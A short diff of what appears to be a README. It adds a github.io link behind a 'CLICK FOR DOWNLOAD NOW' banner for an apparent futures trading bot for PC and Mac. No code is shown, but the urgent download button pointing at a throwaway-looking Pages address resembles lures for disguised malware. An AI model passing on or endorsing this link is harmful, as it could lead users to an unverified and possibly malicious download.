@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://futures-arbot-pcwinmac-nw04.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
